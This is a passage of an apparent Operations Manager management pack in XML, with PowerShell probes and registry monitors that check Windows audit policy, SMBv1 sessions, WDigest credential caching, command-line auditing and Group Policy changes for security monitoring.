                      </SimpleExpression>
                    </Expression>
                    <Expression>
                      <SimpleExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[4]</XPathQuery>
                        </ValueExpression>
                        <Operator>NotEqual</Operator>
                        <ValueExpression>
                          <Value Type="String">$Config/AGPMAccount$</Value>
                        </ValueExpression>
                      </SimpleExpression>
                    </Expression>
                    <Expression>
                      <SimpleExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[5]</XPathQuery>
                        </ValueExpression>
                        <Operator>NotEqual</Operator>
                        <ValueExpression>
                          <Value Type="String">$Config/AGPMDomain$</Value>
                        </ValueExpression>
                      </SimpleExpression>
                    </Expression>
                  </And>
                </Expression>
              </DataSource>
              <ProbeAction ID="Probe" TypeID="SecurityMonitoringMP.GPOMonitoring.ProbeActionModule.GPOCorrelationScript">
                <gpoGUID>"$Data/Params/Param[9]$"</gpoGUID>
                <gpoDomain>"$Data/Params/Param[7]$"</gpoDomain>
                <gpoUser>"$Data/Params/Param[4]$"</gpoUser>
                <opCorrId>"$Data/Params/Param[1]$"</opCorrId>
                <opCode>"$Data/Params/Param[15]$"</opCode>
              </ProbeAction>
            </MemberModules>
            <Composition>
              <Node ID="Probe">
                <Node ID="Event" />
              </Node>
            </Composition>
          </Composite>
        </ModuleImplementation>
        <OutputType>System!System.PropertyBagData</OutputType>
      </DataSourceModuleType>
      <ProbeActionModuleType ID="Security.Monitoring.AuditPol.PowerShell" Accessibility="Internal" Batching="false" PassThrough="false">
        <Configuration>
          <IncludeSchemaTypes>
            <SchemaType>Windows!Microsoft.Windows.PowerShellSchema</SchemaType>
          </IncludeSchemaTypes>
          <xsd:element minOccurs="1" name="SubCommandAuditSetting" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
        </Configuration>
        <ModuleImplementation Isolation="Any">
          <Composite>
            <MemberModules>
              <ProbeAction ID="PSScript" TypeID="Windows!Microsoft.Windows.PowerShellPropertyBagTriggerOnlyProbe">
                <ScriptName>AuditPol.ps1</ScriptName>
                <ScriptBody>Param($SubCommandAuditSetting)
$api = New-Object -comObject 'MOM.ScriptAPI'
$bag = $api.CreatePropertyBag()
$setting = @(auditpol /get /subcategory:$SubCommandAuditSetting)
If($setting[4] -match "No Auditing")
{
	$bag.addvalue('AuditSetting','No Auditing')
}
If($setting[4] -match "Success and Failure")
{
	$bag.addvalue('AuditSetting','Success and Failure')
}
If($setting[4] -match "Success" -and $setting[4] -notmatch "Success and")
{
	$bag.addvalue('AuditSetting','Success Only')
}
If($setting[4] -match "Failure" -and $setting[4] -notmatch "Success and")
{
	$bag.addvalue('AuditSetting','Failure Only')
}
$bag</ScriptBody>
                <SnapIns />
                <Parameters>
                  <Parameter>
                    <Name>SubCommandAuditSetting</Name>
                    <Value>$Config/SubCommandAuditSetting$</Value>
                  </Parameter>
                </Parameters>
                <TimeoutSeconds>60</TimeoutSeconds>
              </ProbeAction>
            </MemberModules>
            <Composition>
              <Node ID="PSScript" />
            </Composition>
          </Composite>
        </ModuleImplementation>
        <OutputType>System!System.PropertyBagData</OutputType>
        <TriggerOnly>true</TriggerOnly>
      </ProbeActionModuleType>
      <ProbeActionModuleType ID="Security.Monitoring.SMBv1Connections.PowerShell" Accessibility="Internal" Batching="false" PassThrough="false">
        <Configuration>
          <IncludeSchemaTypes>
            <SchemaType>Windows!Microsoft.Windows.PowerShellSchema</SchemaType>
          </IncludeSchemaTypes>
          <xsd:element minOccurs="1" name="TimeOut" type="xsd:integer" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
        </Configuration>
        <ModuleImplementation Isolation="Any">
          <Composite>
            <MemberModules>
              <ProbeAction ID="PSScript" TypeID="Windows!Microsoft.Windows.PowerShellPropertyBagTriggerOnlyProbe">
                <ScriptName>SMBv1_Connections.ps1</ScriptName>
                <ScriptBody>$api = New-Object -comObject 'MOM.ScriptAPI'
$bag = $api.CreatePropertyBag()

$connections = Get-SmbSession | Select Dialect,ClientComputerName,ClientUserName | ? Dialect -lt 2

if($connections -ne $null) {
	$bag.addvalue("Connections",1)
}
$bag</ScriptBody>
                <SnapIns />
                <TimeoutSeconds>$Config/TimeOut$</TimeoutSeconds>
              </ProbeAction>
            </MemberModules>
            <Composition>
              <Node ID="PSScript" />
            </Composition>
          </Composite>
        </ModuleImplementation>
        <OutputType>System!System.PropertyBagData</OutputType>
        <TriggerOnly>true</TriggerOnly>
      </ProbeActionModuleType>
      <ProbeActionModuleType ID="Security.Monitoring.MultiStringRegistry.PowerShell" Accessibility="Internal" Batching="false" PassThrough="false">
        <Configuration>
          <IncludeSchemaTypes>
            <SchemaType>Windows!Microsoft.Windows.PowerShellSchema</SchemaType>
          </IncludeSchemaTypes>
          <xsd:element minOccurs="1" name="RegKey" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="1" name="RegAttribute" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
        </Configuration>
        <ModuleImplementation Isolation="Any">
          <Composite>
            <MemberModules>
              <ProbeAction ID="PSScript" TypeID="Windows!Microsoft.Windows.PowerShellPropertyBagTriggerOnlyProbe">
                <ScriptName>MultiStringRegistry.ps1</ScriptName>
                <ScriptBody>Param($key,$attribute)
$api = New-Object -comObject 'MOM.ScriptAPI'
$bag = $api.CreatePropertyBag()
$AuthPkgs = @(Get-ItemProperty -Path $key -Name $attribute | select -ExpandProperty $attribute)
$AuthPkg = $AuthPkgs[0] + $AuthPkgs[1] + $AuthPkgs[2] + $AuthPkgs[3]
if($AuthPkg -ne $null) {
	$bag.addvalue('AuthPkg',$AuthPkg)
}
$bag</ScriptBody>
                <SnapIns />
                <Parameters>
                  <Parameter>
                    <Name>key</Name>
                    <Value>$Config/RegKey$</Value>
                  </Parameter>
                  <Parameter>
                    <Name>attribute</Name>
                    <Value>$Config/RegAttribute$</Value>
                  </Parameter>
                </Parameters>
                <TimeoutSeconds>60</TimeoutSeconds>
              </ProbeAction>
            </MemberModules>
            <Composition>
              <Node ID="PSScript" />
            </Composition>
          </Composite>
        </ModuleImplementation>
        <OutputType>System!System.PropertyBagData</OutputType>
        <TriggerOnly>true</TriggerOnly>
      </ProbeActionModuleType>
      <ProbeActionModuleType ID="SecurityMonitoringMP.GPOMonitoring.ProbeActionModule.GPOCorrelationScript" Accessibility="Public" Batching="false" PassThrough="false">
        <Configuration>
          <xsd:element minOccurs="1" name="gpoGUID" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="1" name="gpoDomain" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="1" name="gpoUser" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="1" name="opCorrId" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="1" name="opCode" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
        </Configuration>
        <ModuleImplementation Isolation="Any">
          <Composite>
            <MemberModules>
              <ProbeAction ID="Script" TypeID="Windows!Microsoft.Windows.PowerShellPropertyBagProbe">
                <ScriptName>SMBv1_Connections.ps1</ScriptName>
                <ScriptBody>Param($gpoGUIDRaw,$gpoDomainRaw,$gpoUserRaw,$opCorrIdRaw,$opCodeRaw)

function debug($msg)
{
  #Function to write debug information to disk.  Modify path below per your needs.
  [string]::Format("{0} {1}",[datetime]::Now,$msg) | Out-File -FilePath C:\temp\CorrelateGPO.txt -Append
}

$error.Clear()
#debug("Starting Execution of CorrelateGPO.ps1 " + $error[0])
#debug("Initial Variables - gpoGUIDRaw: " + $gpoGUIDRaw + ", gpoDomainRaw: " + $gpoDomainRaw + ", gpoUserRaw: " + $gpoUserRaw + " . Error: " + $error[0])
$api = new-object -comObject 'MOM.ScriptAPI'
#debug("Initialized Mom.ScriptAPI " + $error[0] )
$api.LogScriptEvent("CorrelateGPO.ps1", 1701, 2, "PowerShell Script to correlate GPO changes ran.")
$bag = $api.CreatePropertyBag()
#debug("Created empty property bag " + $error[0])
import-module grouppolicy

#The following line parses the GPO GUID out of the ObjectDN
#$gpoGUID = $gpoGUIDRaw.Split('{}')[1]
$gpoGUID = [Regex]::Matches($gpoGUIDRaw, '(?&lt;={)(.*?)(?=})') | Select -ExpandProperty Value

#debug("Parsed GPO GUID as: " +$gpoGUID + " . " + $error[0])
$gpoDomain = $gpoDomainRaw
#debug("Parsed GPO Domain as: " + $gpoDomain + " "+ $error[0])
$gpoUser = $gpoUserRaw
#debug("Parsed GPO User as: " + $gpoUser + " " + $error[0])
$opCorrId = [Regex]::Matches($opCorrIdRaw, '(?&lt;={)(.*?)(?=})') | Select -ExpandProperty Value
#debug("Parsed GPO User as: " + $gpoUser + " " + $error[0])


#Pull displayName from GUID
$item = Get-GPO -Guid $gpoGUID
$gpoName = $item.DisplayName
#$gpo = Get-GroupPolicyObject $gpoGUID
#$gpoName = $gpo.properties["displayname"]
debug("Queries for GPO Name " + $error[0])

$Text = "A Group Policy Has been Modified`n User: $($gpoUser)`n GPO Domain: $($gpoDomain) `n GPO Name: $($gpoName) `n GPO GUID: $($gpoGUID)"
#debug("Built Text as:  " + $Text + " . Error: " + $error[0])

#Format the OpCode, remove quotes and percent signs.
$opCode = [Regex]::Matches($opCodeRaw, '(?&lt;=%%)(.*?)(?=")') | Select -ExpandProperty Value
#debug("Parsed GPO User as: " + $gpoUser + " " + $error[0])
switch($opCode){
	14674 {$opCode="Value Added (" + $opCode + ")"}
	14675 {$opCode="Value Deleted (" + $opCode + ")"}
	14676 {$opCode="Active Directory Domain Services (" + $opCode + ")"}
	14677 {$opCode="Active Directory Lightweight Directory Services (" + $opCode + ")"}
	14678 {$opCode="Yes (" + $opCode + ")"}
	14679 {$opCode="No (" + $opCode + ")"}
	14680 {$opCode="Value Added With Expiration Time (" + $opCode + ")"}
	14681 {$opCode="Value Deleted With Expiration Time (" + $opCode + ")"}
	default {$opCode="Unknown/Other Operation (" + $opCode + ")"}
}

$bag.AddValue('gpoGUID', $gpoGUID)
$bag.AddValue('gpoName', $gpoName)
$bag.AddValue('gpoDomain', $gpoDomain)
$bag.AddValue('gpoUser', $gpoUser)
$bag.AddValue('text', $Text)
$bag.AddValue('opCorrId',$opCorrId)
$bag.AddValue('opCode', $opCode)
$bag.AddValue('status', "OK")
#debug("Added values to property bag " + $error[0])
#debug("Returning property bag" + $error[0])
$bag</ScriptBody>
                <Parameters>
                  <Parameter>
                    <Name>gpoGUID</Name>
                    <Value>$Config/gpoGUID$</Value>
                  </Parameter>
                  <Parameter>
                    <Name>gpoDomain</Name>
                    <Value>$Config/gpoDomain$</Value>
                  </Parameter>
                  <Parameter>
                    <Name>gpoUser</Name>
                    <Value>$Config/gpoUser$</Value>
                  </Parameter>
                  <Parameter>
                    <Name>opCorrId</Name>
                    <Value>$Config/opCorrId$</Value>
                  </Parameter>
                  <Parameter>
                    <Name>opCode</Name>
                    <Value>$Config/opCode$</Value>
                  </Parameter>
                </Parameters>
                <TimeoutSeconds>300</TimeoutSeconds>
              </ProbeAction>
            </MemberModules>
            <Composition>
              <Node ID="Script" />
            </Composition>
          </Composite>
        </ModuleImplementation>
        <OutputType>System!System.PropertyBagData</OutputType>
        <InputType>System!System.BaseData</InputType>
      </ProbeActionModuleType>
    </ModuleTypes>
    <MonitorTypes>
      <UnitMonitorType ID="Security.Monitoring.AuditPolMonitorType" Accessibility="Public">
        <MonitorTypeStates>
          <MonitorTypeState ID="ResultBad" NoDetection="false" />
          <MonitorTypeState ID="ResultGood" NoDetection="false" />
        </MonitorTypeStates>
        <Configuration>
          <xsd:element minOccurs="1" name="IntervalSeconds" type="xsd:integer" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="SyncTime" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="1" name="SubCommandAuditSetting" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="1" name="Result" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
        </Configuration>
        <OverrideableParameters>
          <OverrideableParameter ID="IntervalSeconds" Selector="$Config/IntervalSeconds$" ParameterType="int" />
          <OverrideableParameter ID="SyncTime" Selector="$Config/SyncTime$" ParameterType="string" />
        </OverrideableParameters>
        <MonitorImplementation>
          <MemberModules>
            <DataSource ID="AuditPol" TypeID="Security.Monitoring.AuditPol.DS">
              <IntervalSeconds>$Config/IntervalSeconds$</IntervalSeconds>
              <SyncTime>$Config/SyncTime$</SyncTime>
              <SubCommandAuditSetting>$Config/SubCommandAuditSetting$</SubCommandAuditSetting>
            </DataSource>
            <ConditionDetection ID="CDGood" TypeID="System!System.ExpressionFilter">
              <Expression>
                <SimpleExpression>
                  <ValueExpression>
                    <XPathQuery Type="String">Property[@Name='AuditSetting']</XPathQuery>
                  </ValueExpression>
                  <Operator>Equal</Operator>
                  <ValueExpression>
                    <Value Type="String">$Config/Result$</Value>
                  </ValueExpression>
                </SimpleExpression>
              </Expression>
            </ConditionDetection>
            <ConditionDetection ID="CDBad" TypeID="System!System.ExpressionFilter">
              <Expression>
                <SimpleExpression>
                  <ValueExpression>
                    <XPathQuery Type="String">Property[@Name='AuditSetting']</XPathQuery>
                  </ValueExpression>
                  <Operator>NotEqual</Operator>
                  <ValueExpression>
                    <Value Type="String">$Config/Result$</Value>
                  </ValueExpression>
                </SimpleExpression>
              </Expression>
            </ConditionDetection>
          </MemberModules>
          <RegularDetections>
            <RegularDetection MonitorTypeStateID="ResultBad">
              <Node ID="CDBad">
                <Node ID="AuditPol" />
              </Node>
            </RegularDetection>
            <RegularDetection MonitorTypeStateID="ResultGood">
              <Node ID="CDGood">
                <Node ID="AuditPol" />
              </Node>
            </RegularDetection>
          </RegularDetections>
        </MonitorImplementation>
      </UnitMonitorType>
      <UnitMonitorType ID="CheckRegValue" Accessibility="Internal">
        <MonitorTypeStates>
          <MonitorTypeState ID="RegValueBad" NoDetection="false" />
          <MonitorTypeState ID="RegValueGood" NoDetection="false" />
        </MonitorTypeStates>
        <Configuration>
          <xsd:element minOccurs="1" name="Path" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="1" name="ComputerName" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="1" name="AttributeName" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="1" name="PathType" type="xsd:int" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="1" name="AttributeType" type="xsd:int" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="1" name="RegistryValue" type="xsd:int" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
        </Configuration>
        <MonitorImplementation>
          <MemberModules>
            <DataSource ID="RegDS" TypeID="Windows!Microsoft.Windows.RegistryProvider">
              <ComputerName>$Config/ComputerName$</ComputerName>
              <RegistryAttributeDefinitions>
                <RegistryAttributeDefinition>
                  <AttributeName>$Config/AttributeName$</AttributeName>
                  <Path>$Config/Path$</Path>
                  <PathType>$Config/PathType$</PathType>
                  <AttributeType>$Config/AttributeType$</AttributeType>
                </RegistryAttributeDefinition>
              </RegistryAttributeDefinitions>
              <Frequency>900</Frequency>
            </DataSource>
            <ConditionDetection ID="CDGood" TypeID="System!System.ExpressionFilter">
              <Expression>
                <SimpleExpression>
                  <ValueExpression>
                    <XPathQuery Type="UnsignedInteger">Values/$Config/AttributeName$</XPathQuery>
                    <!--Not sure if this will work passing this in this capacity, but it builds-->
                  </ValueExpression>
                  <Operator>Equal</Operator>
                  <ValueExpression>
                    <Value Type="UnsignedInteger">$Config/RegistryValue$</Value>
                  </ValueExpression>
                </SimpleExpression>
              </Expression>
            </ConditionDetection>
            <ConditionDetection ID="CDBad" TypeID="System!System.ExpressionFilter">
              <Expression>
                <SimpleExpression>
                  <ValueExpression>
                    <XPathQuery Type="UnsignedInteger">Values/$Config/AttributeName$</XPathQuery>
                    <!--Not sure if this will work passing this in this capacity, but it builds-->
                  </ValueExpression>
                  <Operator>NotEqual</Operator>
                  <ValueExpression>
                    <Value Type="UnsignedInteger">$Config/RegistryValue$</Value>
                  </ValueExpression>
                </SimpleExpression>
              </Expression>
            </ConditionDetection>
          </MemberModules>
          <RegularDetections>
            <RegularDetection MonitorTypeStateID="RegValueBad">
              <Node ID="CDBad">
                <Node ID="RegDS" />
              </Node>
            </RegularDetection>
            <RegularDetection MonitorTypeStateID="RegValueGood">
              <Node ID="CDGood">
                <Node ID="RegDS" />
              </Node>
            </RegularDetection>
          </RegularDetections>
        </MonitorImplementation>
      </UnitMonitorType>
      <UnitMonitorType ID="CheckRegValueString" Accessibility="Internal">
        <MonitorTypeStates>
          <MonitorTypeState ID="RegValueBad" NoDetection="false" />
          <MonitorTypeState ID="RegValueGood" NoDetection="false" />
        </MonitorTypeStates>
        <Configuration>
          <xsd:element minOccurs="1" name="Path" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="1" name="AttributeName" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="1" name="PathType" type="xsd:int" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="1" name="AttributeType" type="xsd:int" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="1" name="RegistryValue" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="1" name="ValuesAttribute" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
        </Configuration>
        <MonitorImplementation>
          <MemberModules>
            <DataSource ID="RegDS" TypeID="Windows!Microsoft.Windows.RegistryProvider">
              <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
              <RegistryAttributeDefinitions>
                <RegistryAttributeDefinition>
                  <AttributeName>$Config/AttributeName$</AttributeName>
                  <Path>$Config/Path$</Path>
                  <PathType>$Config/PathType$</PathType>
                  <AttributeType>$Config/AttributeType$</AttributeType>
                </RegistryAttributeDefinition>
              </RegistryAttributeDefinitions>
              <Frequency>900</Frequency>
            </DataSource>
            <ConditionDetection ID="CDGood" TypeID="System!System.ExpressionFilter">
              <Expression>
                <RegExExpression>
                  <ValueExpression>
                    <XPathQuery Type="String">$Config/ValuesAttribute$</XPathQuery>
                    <!--Not sure if this will work passing this in this capacity, but it builds-->
                  </ValueExpression>
                  <Operator>MatchesRegularExpression</Operator>
                  <Pattern>$Config/RegistryValue$</Pattern>
                </RegExExpression>
              </Expression>
            </ConditionDetection>
            <ConditionDetection ID="CDBad" TypeID="System!System.ExpressionFilter">
              <Expression>
                <RegExExpression>
                  <ValueExpression>
                    <XPathQuery Type="String">$Config/ValuesAttribute$</XPathQuery>
                    <!--Not sure if this will work passing this in this capacity, but it builds-->
                  </ValueExpression>
                  <Operator>DoesNotMatchRegularExpression</Operator>
                  <Pattern>$Config/RegistryValue$</Pattern>
                </RegExExpression>
              </Expression>
            </ConditionDetection>
          </MemberModules>
          <RegularDetections>
            <RegularDetection MonitorTypeStateID="RegValueBad">
              <Node ID="CDBad">
                <Node ID="RegDS" />
              </Node>
            </RegularDetection>
            <RegularDetection MonitorTypeStateID="RegValueGood">
              <Node ID="CDGood">
                <Node ID="RegDS" />
              </Node>
            </RegularDetection>
          </RegularDetections>
        </MonitorImplementation>
      </UnitMonitorType>
      <UnitMonitorType ID="SecurityMonitoringMP.CommandLineAuditSetting" Accessibility="Internal">
        <MonitorTypeStates>
          <MonitorTypeState ID="RegValueBad" NoDetection="false" />
          <MonitorTypeState ID="RegValueGood" NoDetection="false" />
        </MonitorTypeStates>
        <Configuration>
          <xsd:element minOccurs="1" name="ComputerName" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
        </Configuration>
        <MonitorImplementation>
          <MemberModules>
            <DataSource ID="RegDS" TypeID="Windows!Microsoft.Windows.RegistryProvider">
              <ComputerName>$Config/ComputerName$</ComputerName>
              <RegistryAttributeDefinitions>
                <RegistryAttributeDefinition>
                  <AttributeName>ProcessCreationIncludeCmdLine_Enabled</AttributeName>
                  <Path>SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system\Audit\ProcessCreationIncludeCmdLine_Enabled</Path>
                  <PathType>1</PathType>
                  <AttributeType>2</AttributeType>
                </RegistryAttributeDefinition>
              </RegistryAttributeDefinitions>
              <Frequency>900</Frequency>
            </DataSource>
            <ConditionDetection ID="CDGood" TypeID="System!System.ExpressionFilter">
              <Expression>
                <SimpleExpression>
                  <ValueExpression>
                    <XPathQuery Type="UnsignedInteger">Values/ProcessCreationIncludeCmdLine_Enabled</XPathQuery>
                  </ValueExpression>
                  <Operator>Equal</Operator>
                  <ValueExpression>
                    <Value Type="UnsignedInteger">1</Value>
                  </ValueExpression>
                </SimpleExpression>
              </Expression>
            </ConditionDetection>
            <ConditionDetection ID="CDBad" TypeID="System!System.ExpressionFilter">
              <Expression>
                <SimpleExpression>
                  <ValueExpression>
                    <XPathQuery Type="UnsignedInteger">Values/ProcessCreationIncludeCmdLine_Enabled</XPathQuery>
                  </ValueExpression>
                  <Operator>NotEqual</Operator>
                  <ValueExpression>
                    <Value Type="UnsignedInteger">1</Value>
                  </ValueExpression>
                </SimpleExpression>
              </Expression>
            </ConditionDetection>
          </MemberModules>
          <RegularDetections>
            <RegularDetection MonitorTypeStateID="RegValueBad">
              <Node ID="CDBad">
                <Node ID="RegDS" />
              </Node>
            </RegularDetection>
            <RegularDetection MonitorTypeStateID="RegValueGood">
              <Node ID="CDGood">
                <Node ID="RegDS" />
              </Node>
            </RegularDetection>
          </RegularDetections>
        </MonitorImplementation>
      </UnitMonitorType>
      <UnitMonitorType ID="MultiStringRegMonitorType" Accessibility="Internal">
        <MonitorTypeStates>
          <MonitorTypeState ID="RegValueBad" NoDetection="false" />
          <MonitorTypeState ID="RegValueGood" NoDetection="false" />
        </MonitorTypeStates>
        <Configuration>
          <xsd:element minOccurs="1" name="IntervalSeconds" type="xsd:integer" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="SyncTime" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="RegKey" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="RegAttribute" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="RegValue" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
        </Configuration>
        <OverrideableParameters>
          <OverrideableParameter ID="IntervalSeconds" Selector="$Config/IntervalSeconds$" ParameterType="int" />
          <OverrideableParameter ID="SyncTime" Selector="$Config/SyncTime$" ParameterType="string" />
          <OverrideableParameter ID="RegValue" Selector="$Config/RegValue$" ParameterType="string" />
        </OverrideableParameters>
        <MonitorImplementation>
          <MemberModules>
            <DataSource ID="RegDS" TypeID="Security.Monitoring.MultiStringRegistry.DS">
              <IntervalSeconds>$Config/IntervalSeconds$</IntervalSeconds>
              <SyncTime>$Config/SyncTime$</SyncTime>
              <RegKey>$Config/RegKey$</RegKey>
              <RegAttribute>$Config/RegAttribute$</RegAttribute>
            </DataSource>
            <ConditionDetection ID="CDGood" TypeID="System!System.ExpressionFilter">
              <Expression>
                <SimpleExpression>
                  <ValueExpression>
                    <XPathQuery Type="String">Property[@Name='AuthPkg']</XPathQuery>
                  </ValueExpression>
                  <Operator>Equal</Operator>
                  <ValueExpression>
                    <Value Type="String">$Config/RegValue$</Value>
                  </ValueExpression>
                </SimpleExpression>
              </Expression>
            </ConditionDetection>
            <ConditionDetection ID="CDBad" TypeID="System!System.ExpressionFilter">
              <Expression>
                <SimpleExpression>
                  <ValueExpression>
                    <XPathQuery Type="String">Property[@Name='AuthPkg']</XPathQuery>
                  </ValueExpression>
                  <Operator>NotEqual</Operator>
                  <ValueExpression>
                    <Value Type="String">$Config/RegValue$</Value>
                  </ValueExpression>
                </SimpleExpression>
              </Expression>
            </ConditionDetection>
          </MemberModules>
          <RegularDetections>
            <RegularDetection MonitorTypeStateID="RegValueBad">
              <Node ID="CDBad">
                <Node ID="RegDS" />
              </Node>
            </RegularDetection>
            <RegularDetection MonitorTypeStateID="RegValueGood">
              <Node ID="CDGood">
                <Node ID="RegDS" />
              </Node>
            </RegularDetection>
          </RegularDetections>
        </MonitorImplementation>
      </UnitMonitorType>
      <UnitMonitorType ID="SecurityMonitoringMP.RegValueExistsMonitorType" Accessibility="Internal">
        <MonitorTypeStates>
          <MonitorTypeState ID="RegValueExists" NoDetection="false" />
          <MonitorTypeState ID="RegValueMissing" NoDetection="false" />
        </MonitorTypeStates>
        <Configuration />
        <MonitorImplementation>
          <MemberModules>
            <DataSource ID="RegValueDS" TypeID="Windows!Microsoft.Windows.RegistryProvider">
              <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
              <RegistryAttributeDefinitions>
                <RegistryAttributeDefinition>
                  <AttributeName>UseLogonCredential</AttributeName>
                  <Path>SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest\UseLogonCredential</Path>
                  <PathType>1</PathType>
                  <AttributeType>0</AttributeType>
                </RegistryAttributeDefinition>
              </RegistryAttributeDefinitions>
              <Frequency>900</Frequency>
            </DataSource>
            <ConditionDetection ID="ValueExists" TypeID="System!System.ExpressionFilter">
              <Expression>
                <SimpleExpression>
                  <ValueExpression>
                    <XPathQuery Type="String">Values/UseLogonCredential</XPathQuery>
                  </ValueExpression>
                  <Operator>Equal</Operator>
                  <ValueExpression>
                    <Value Type="String">true</Value>
                  </ValueExpression>
                </SimpleExpression>
              </Expression>
            </ConditionDetection>
            <ConditionDetection ID="ValueMissing" TypeID="System!System.ExpressionFilter">
              <Expression>
                <SimpleExpression>
                  <ValueExpression>
                    <XPathQuery Type="String">Values/UseLogonCredential</XPathQuery>
                  </ValueExpression>
                  <Operator>Equal</Operator>
                  <ValueExpression>
                    <Value Type="String">false</Value>
                  </ValueExpression>
                </SimpleExpression>
              </Expression>
            </ConditionDetection>
          </MemberModules>
          <RegularDetections>
            <RegularDetection MonitorTypeStateID="RegValueExists">
              <Node ID="ValueExists">
                <Node ID="RegValueDS" />
              </Node>
            </RegularDetection>
            <RegularDetection MonitorTypeStateID="RegValueMissing">
              <Node ID="ValueMissing">
                <Node ID="RegValueDS" />
              </Node>
            </RegularDetection>
          </RegularDetections>
        </MonitorImplementation>
      </UnitMonitorType>
      <UnitMonitorType ID="SecurityMonitoringMP.RegValueMonitorType" Accessibility="Internal">
        <MonitorTypeStates>
          <MonitorTypeState ID="RegValueBad" NoDetection="false" />
          <MonitorTypeState ID="RegValueGood" NoDetection="false" />
        </MonitorTypeStates>
        <Configuration />
        <MonitorImplementation>
          <MemberModules>
            <DataSource ID="RegDS" TypeID="Windows!Microsoft.Windows.RegistryProvider">
              <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
              <RegistryAttributeDefinitions>
                <RegistryAttributeDefinition>
                  <AttributeName>UseLogonCredential</AttributeName>
                  <Path>SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest\UseLogonCredential</Path>
                  <PathType>1</PathType>
                  <AttributeType>2</AttributeType>
                </RegistryAttributeDefinition>
              </RegistryAttributeDefinitions>
              <Frequency>900</Frequency>
            </DataSource>
            <ConditionDetection ID="CDGood" TypeID="System!System.ExpressionFilter">
              <Expression>
                <SimpleExpression>
                  <ValueExpression>
                    <XPathQuery Type="UnsignedInteger">Values/UseLogonCredential</XPathQuery>
                  </ValueExpression>
                  <Operator>Equal</Operator>
                  <ValueExpression>
                    <Value Type="UnsignedInteger">0</Value>
                  </ValueExpression>
                </SimpleExpression>
              </Expression>
            </ConditionDetection>
            <ConditionDetection ID="CDBad" TypeID="System!System.ExpressionFilter">
              <Expression>
                <SimpleExpression>
                  <ValueExpression>
                    <XPathQuery Type="UnsignedInteger">Values/UseLogonCredential</XPathQuery>
                  </ValueExpression>
                  <Operator>NotEqual</Operator>
                  <ValueExpression>
                    <Value Type="UnsignedInteger">0</Value>
                  </ValueExpression>
                </SimpleExpression>
              </Expression>
            </ConditionDetection>
          </MemberModules>
          <RegularDetections>
            <RegularDetection MonitorTypeStateID="RegValueBad">
              <Node ID="CDBad">
                <Node ID="RegDS" />
              </Node>
            </RegularDetection>
            <RegularDetection MonitorTypeStateID="RegValueGood">
              <Node ID="CDGood">
                <Node ID="RegDS" />
              </Node>
            </RegularDetection>
          </RegularDetections>
        </MonitorImplementation>
      </UnitMonitorType>
    </MonitorTypes>
  </TypeDefinitions>
  <Monitoring>
    <Discoveries>
      <Discovery ID="Security.Monitoring.AdminAccountDiscovery" Enabled="false" Target="Windows!Microsoft.Windows.Computer" ConfirmDelivery="false" Remotable="true" Priority="Normal">
        <Category>Discovery</Category>
        <DiscoveryTypes>
          <DiscoveryClass TypeID="Security.Monitoring.AdminAccounts">
            <Property TypeID="Security.Monitoring.AdminAccounts" PropertyID="DistinguishedName" />
            <Property TypeID="Security.Monitoring.AdminAccounts" PropertyID="Enabled" />
            <Property TypeID="Security.Monitoring.AdminAccounts" PropertyID="Name" />
            <Property TypeID="Security.Monitoring.AdminAccounts" PropertyID="SAMAccountName" />
            <Property TypeID="Security.Monitoring.AdminAccounts" PropertyID="UPN" />
          </DiscoveryClass>
